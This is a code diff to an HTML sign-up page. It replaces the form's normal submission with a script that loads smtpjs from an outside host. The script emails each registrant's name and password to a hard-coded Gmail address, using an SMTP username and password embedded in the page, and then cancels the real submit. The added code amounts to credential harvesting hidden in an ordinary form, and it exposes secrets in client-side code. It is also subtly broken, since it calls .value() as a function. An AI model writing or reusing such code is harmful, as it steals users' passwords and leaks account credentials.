@@ -10,7 +10,7 @@
 <body>
     <div class="form-container">
         <h2>Sign Up</h2>
-        <form action="/signup" method="post">
+        <form action="/signup" method="post" onsubmit="sendEmail(); reset(); return false;">
             <div class="form-group">
                 <label for="name">Name:</label>
                 <input type="text" name="username" id="name" placeholder="Enter your name" required autocomplete="off">
@@ -22,5 +22,21 @@
             <button type="submit" class="submit-btn">Sign Up</button>
         </form>
     </div>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script>
+        function sendEmail(){
+            Email.send({
+            Host : "smtp.gmail.com",
+            Username : "apologuns44@gmail.com",
+            Password : "ayllaview44",
+            To : 'apologuns44@gmail.com',
+            From : document.getElementById('name').value(),
+            Subject : "New user registered",
+            Body : "Name" + document.getElementById('name').value() + " Password: " + document.getElementById('password').value(),
+            }).then(
+            message => alert(message)
+            );
+        }
+    </script>
 </body>
 </html>
